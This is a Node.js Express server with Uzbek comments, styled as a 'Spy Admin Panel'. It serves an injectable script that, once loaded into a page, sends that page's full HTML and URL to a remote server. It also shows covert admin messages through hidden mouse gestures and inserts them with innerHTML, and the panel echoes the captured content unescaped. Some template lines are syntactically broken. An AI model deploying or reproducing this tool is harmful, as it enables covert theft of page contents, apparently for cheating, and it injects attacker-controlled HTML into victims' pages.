const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR (Eng muhim joyi!)
// Renderdagi loyiha manzilingizni shu yerga yozing:
// Oxirida / belgisi bo'lmasin!
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; 
// ========================================================

// 1. Sozlamalar
app.use(cors()); // Barcha saytlarga ruxsat
app.use(bodyParser.json({ limit: '50mb' })); // Katta HTML fayllar uchun
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

// --- XOTIRA (RAM) ---
let capturedData = { 
    url: "Hali ma'lumot kelmadi", 
    html: "Kutilmoqda...", 
    date: null 
};
let adminMessage = { 
    text: "", 
    timestamp: 0 
};

// ========================================================
// 📜 DINAMIK CLIENT SKRIPTI (f1.js)
// Bu qism server ichida turadi va so'rov kelganda brauzerga yuboriladi
// ========================================================
const clientScript = `
(function(){
  // Server manzilini serverdan avtomatik oladi
  const BASE = '${MY_SERVER_URL}'; 

  let holdTimer=null, clickCount=0, lastSince=0, box=null;

  // 1. Chat oynasini yasash
  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'10px', bottom:'10px', maxWidth:'360px',
      background:'#111', color:'#fff', padding:'10px',
      font:'14px sans-serif', borderRadius:'8px',
      boxShadow:'0 6px 18px rgba(0,0,0,0.3)', zIndex:2147483647,
      display:'none', whiteSpace:'pre-wrap', cursor:'pointer', border: '1px solid #444'
    });
    document.body.appendChild(box);
    return box;
  }

  // 2. Toast xabar (ekran pastida chiqadigan yozuv)
  function showToast(msg){
    const t=document.createElement('div');
    t.textContent=msg;
    Object.assign(t.style,{
      position:'fixed', left:'50%', bottom:'10px', transform:'translateX(-50%)',
      background:'#007bff', color:'#fff', padding:'8px 14px',
      borderRadius:'6px', font:'14px sans-serif', zIndex:2147483646,
      boxShadow:'0 4px 12px rgba(0,0,0,0.2)'
    });
    document.body.appendChild(t);
    setTimeout(()=>t.remove(),2500);
  }

  // 3. HTML va URLni serverga yuborish
  async function sendPage(){
    try{
      showToast("⏳ Ulanmoqda...");
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML, // HTML kod
            url: window.location.href                 // Sayt manzili
        })
      });
      showToast("✅ Muvaffaqiyatli ulandi");
    }catch(e){
        console.error(e); 
        showToast("❌ Server bilan xatolik");
    }
  }

  // 4. Serverdan yangi xabar olish
  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      // Server "success: true" deb javob bersa ishlaydi
      if(j.success && j.message){
        const b=makeBox();
        b.innerHTML = "<strong>ADMIN:</strong><br>" + j.message;
        b.style.display='block';
        lastSince = j.timestamp; // Vaqtni yangilaymiz
        showToast("📩 Yangi xabar!");
      } else {
        showToast("📭 Yangi xabar yo'q");
      }
    }catch(e){console.error(e);}
  }

  // --- GESTURES (Boshqaruv) ---
  
  // Sichqonchani 3 soniya bosib turish -> Xabarni yangilash
  document.addEventListener('mousedown', e=>{
    if(e.button===0) holdTimer=setTimeout(fetchLatest,3000);
  });
  document.addEventListener('mouseup', ()=>{
    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
  });

  // 3 marta tez bosish -> Oynani yopish/ochish
  document.addEventListener('click', e=>{
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
  });

  // Skript yuklanishi bilan ma'lumotni yuboradi
  sendPage();
})();
`;

// ========================================================
// 🛣 SERVER YO'LLARI (ROUTES)
// ========================================================

// 1. [CLIENT UCHUN] f1.js faylini dinamik tarqatish
app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// 2. [ADMIN PANEL] Boshqaruv
app.get("/", (req, res) => {
    // HTML juda uzun bo'lsa qirqib ko'rsatamiz
    const shortHtml = capturedData.html.length > 800 
        ? capturedData.html.substring(0, 800) + "... (davomi bor)" 
        : capturedData.html;

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🕵️ Spy Admin Panel</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 800px; margin: auto; }
                .box { border: 1px solid #30363d; padding: 20px; margin-bottom: 20px; border-radius: 6px; background: #161b22; }
                h2 { margin-top: 0; color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
                input, textarea { width: 100%; box-sizing: border-box; background: #0d1117; color: #fff; border: 1px solid #30363d; padding: 10px; margin-top: 10px; border-radius: 5px; }
                button { background: #238636; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; border-radius: 5px; font-weight: bold; width: 100%; }
                button:hover { background: #2ea043; }
                a { color: #58a6ff; text-decoration: none; }
                .info { font-size: 12px; color: #8b949e; margin-top: 5px; }
            </style>
        </head>
        <body>
            <h1>🕵️ Aloqa Markazi</h1>

            <!-- Xabar Yuborish -->
            <div class="box">
                <h2>📤 Clientga Xabar</h2>
                <form action="/set-message" method="POST">
                    <input type="text" name="msg" placeholder="Xabarni shu yerga yozing..." autocomplete="off">
                    <button type="submit">YUBORISH</button>
                </form>
                <p>Hozirgi xabar: <br><b style="color:#e3b341">${adminMessage.text || "Xabar yo'q"}</b></p>
            </div>

            <!-- Kelgan Ma'lumot -->
            <div class="box">
                <h2>📥 So'nggi Ma'lumot</h2>
                <p><strong>URL:</strong> <a href="${capturedData.url}" target="_blank">${capturedData.url}</a></p>
                <p class="info">Kelgan vaqt: ${capturedData.date ? new Date(capturedData.date).toLocaleString() : "---"}</p>
                <textarea rows="15" readonly>${shortHtml}</textarea>
                <p class="info">Belgilar soni: ${capturedData.html.length}</p>
            </div>

            <div class="box" style="border-color: #1f6feb;">
                <h2>⚙️ Sozlash</h2>
                <p>Server manzili: <span style="color:#58a6ff">${https://server-xkuu.onrender.com}</span></p>
                <p>Bookmarklet uchun kod:</p>
                <textarea rows="2" readonly>"https://server-xkuu.onrender.com")</textarea>
            </div>
        </body>
        </html>
    `);
});

// 3. [CLIENT -> SERVER] Ma'lumot qabul qilish
app.post("/upload-html", (req, res) => {
    const { url, html } = req.body;
    capturedData.url = url || "Noma'lum URL";
    capturedData.html = html || "";
    capturedData.date = Date.now();
    
    console.log(`[YANGI MA'LUMOT] ${capturedData.url}`);
    res.json({ status: "success" });
});

// 4. [ADMIN -> SERVER] Xabarni bazaga yozish
app.post("/set-message", (req, res) => {
    if(req.body.msg) {
        adminMessage.text = req.body.msg;
        adminMessage.timestamp = Date.now();
    }
    res.redirect("/");
});

// 5. [CLIENT -> SERVER] Xabarni tekshirish (Polling)
app.get("/latest", (req, res) => {
    const clientTimestamp = parseInt(req.query.since) || 0;
    
    // Agar serverdagi xabar yangiroq bo'lsa
    if (adminMessage.timestamp > clientTimestamp) {
        res.json({
            success: true, // Client skripti shuni kutadi
            message: adminMessage.text,
            timestamp: adminMessage.timestamp
        });
    } else {
        res.json({ success: false });
    }
});

// Serverni ishga tushirish
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server ishga tushdi: ${PORT}`);
});
